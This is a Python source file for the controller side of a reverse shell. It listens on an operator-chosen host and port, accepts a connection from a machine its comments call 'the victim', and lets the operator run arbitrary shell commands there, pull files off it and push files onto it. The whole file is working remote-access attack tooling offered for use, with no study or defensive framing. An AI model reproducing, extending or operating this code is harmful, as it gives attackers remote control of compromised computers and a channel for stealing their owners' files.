import socket
import sys
import time


# import interface

def send_commands(conn):
    """Function used to send shell commands; additional used commands: quit, download, upload
    """

    client_response = conn.recv(4096)
    print(client_response.decode("utf-8"))
    while True:
        try:
            cmd = input()
            """ In case of quit command, close the connection
            """
            if cmd == 'quit':
                conn.close()
                s.close()
                sys.exit()
            elif cmd[:8] == 'download':
                """In the case of the 'download' command, receive the needed file using write operation
                """
                conn.send(str.encode(cmd))
                down_file = cmd[9:]
                receive_file = True

                client_response = conn.recv(1024)
                if client_response.endswith(b"Requested file not found"):
                    print("Requested file not found on the client")
                    client_response = conn.recv(4096)
                    print(client_response.decode("utf-8"))

                else:
                    with open(down_file, 'wb') as f:
                        while receive_file:
                            if client_response.endswith(b"EOFEOFEOFEOFEOF"):
                                print("Download completed")
                                data = client_response[:-15]
                                f.write(data)
                                f.close()
                                client_response = conn.recv(4096)
                                print(client_response.decode("utf-8"))
                                receive_file = False
                            else:
                                f.write(client_response)
                                client_response = conn.recv(1024)
            elif cmd[:6] == 'upload':
                """In the case of the 'upload' command, send the added file to the victim
                """
                file_name = cmd[7:]

                try:
                    with open(file_name, 'rb') as f:
                        conn.send(str.encode(cmd))
                        sending = True
                        while sending:
                            file_to_send = f.read(1024)
                            if file_to_send == b'':
                                print("Upload completed")
                                f.close()
                                time.sleep(0.3)
                                conn.send(str.encode("EOFEOFEOFEOFEOF"))
                                client_response = conn.recv(4096)
                                print(client_response.decode("utf-8"))
                                sending = False
                            else:
                                conn.send(file_to_send)
                except FileNotFoundError:
                    print("File not found")
                    print(client_response.decode("utf-8"))
            elif len(str.encode(cmd)) > 0:
                """In case of other shell commands, sent them to the victim and take the  answer
                """
                conn.send(str.encode(cmd))
                client_response = conn.recv(4096)
                print(client_response.decode("utf-8"))
            elif cmd == '':
                """Otherwise, take the answer from the victim
                """
                client_response = conn.recv(10000000)
                print(client_response.decode("utf-8"))
        except (ConnectionResetError, ConnectionAbortedError):
            print("Connection with host was lost")
            s.listen(1)
            print("Listening on " + str(host) + ":" + str(port))
            conn, address = s.accept()
            print("Connection has been established: " + "IP " + address[0] + " |  Port " + str(address[1]))
            send_commands(conn)


# def graphic():
# interface.gui()


def socket_create():
    """Function used to create the connection with the victim and to manage commands"""
    try:
        global s
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
    try:
        s.bind((host, port))
        s.listen(1)
        print("Listening on " + str(host) + ":" + str(port))
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
    conn, address = s.accept()
    print("Connection has been established: " + "IP " + address[0] + " |  Port " + str(address[1]))
    time.sleep(0.5)
    send_commands(conn)


def main():
    """Function used to set the IP address and port number which should be the same as in the victim's program"""
    global host
    try:
        host = input("Enter your local host IP > ")
        print("Set LHOST: %s" % host)
        global port
        port = int(input("Enter the port > "))
        print("Set LPORT: %s" % port)
        socket_create()
    except (ValueError, OSError, OverflowError):
        print("You entered invalid data")
        main()


if __name__ == "__main__":
    # graphic()
    main()
